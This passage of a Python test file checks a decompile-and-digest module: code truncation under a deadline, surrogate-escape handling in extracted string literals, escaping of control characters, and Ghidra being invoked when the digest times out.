    lines = ["void M()", "{", *[f"\tint a{i} = {i};" for i in range(4 * dd.CUT_CHECK_LINES)],
             "\tClipboard.GetText();", "}"]
    code = "\n".join(lines)
    assert "Clipboard" in dd._cut(code, 2000)
    monkeypatch.setattr(dd, "_clock", Clock(1.0))
    cut = dd._cut(code, 2000, deadline=1.5)
    assert len(cut) <= 2000 and cut.startswith("void M()") and "Clipboard" not in cut


def test_literals_pair_surrogate_escapes_and_never_carry_a_lone_one():
    src = 'a = "\\ud83d\\udd11Passwords"; b = "lone \\ud800 here"; c = "\\udc00tail"; d = "end \\ud83d";'
    out = dd.literals(src)
    assert out == ["\U0001f511Passwords", "lone \ufffd here", "\ufffdtail", "end \ufffd"]
    json.dumps(out, ensure_ascii=False).encode("utf-8")  # what sealing the sweep does with them


def test_clean_is_one_pass_over_hostile_text():
    text = "a\x00b\u202ec\ue000d\U000f0000e\n\t" * 200000  # 2.2M characters, four in eleven escaped
    t0 = time.monotonic()
    out = dd.clean(text, 1 << 30)
    assert time.monotonic() - t0 < 3
    assert out.startswith("a\\u0000b\\u202ec\\ue000d\\uf0000e\n\t") and len(out) == 200000 * 32
    assert dd.clean("ab\x00cd", 4) == "ab\\\u2026" and dd.clean("abcdef", 4) == "abcd" and dd.clean("", 9) == ""


def test_a_digest_out_of_time_leaves_the_code_unread_and_ghidra_runs(tmp_path, monkeypatch):
    monkeypatch.setattr(dd, "DIGEST_S", -1.0)
    res, _out, ghidra = _srun(tmp_path, FakeDecompile())
    f = _fields(res)
    assert len(ghidra.calls) == 1  # no excerpt was built, so the decompiler did not read the code
    assert f["decompile_status"] == "ok" and f["decompiled_images"] == 1
